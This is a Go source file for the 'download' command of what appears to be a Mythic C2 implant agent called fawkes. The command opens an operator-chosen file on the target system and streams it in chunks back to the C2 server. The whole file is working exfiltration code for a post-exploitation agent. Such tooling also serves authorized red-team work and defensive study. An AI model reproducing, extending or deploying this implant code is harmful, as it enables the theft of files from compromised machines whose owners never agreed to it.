package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// DownloadCommand implements the download command
type DownloadCommand struct{}

// Name returns the command name
func (c *DownloadCommand) Name() string {
	return "download"
}

// Description returns the command description
func (c *DownloadCommand) Description() string {
	return "Download a file from the target system"
}

// Execute executes the download command with full chunked file transfer
func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
	// Strip surrounding quotes in case the user wrapped the path (e.g. "C:\Program Data\file.txt")
	path := stripPathQuotes(task.Params)

	if path == "" {
		return structs.CommandResult{
			Output:    "Error: No file path specified. Usage: download <file_path>",
			Status:    "error",
			Completed: true,
		}
	}

	// Get absolute path
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving file path: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}

	// Open file
	file, err := os.Open(fullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening file: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}
	defer file.Close()

	// Get file info
	fi, err := file.Stat()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting file size: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}

	// Set up the download message struct
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fi.Name()
	downloadMsg.FullPath = fullPath
	downloadMsg.FinishedTransfer = make(chan int, 2)

	// Send the download request to the file transfer channel
	task.Job.SendFileToMythic <- downloadMsg

	// Wait for transfer to complete or task to stop
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    "Finished Downloading",
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Tasked to stop early",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}
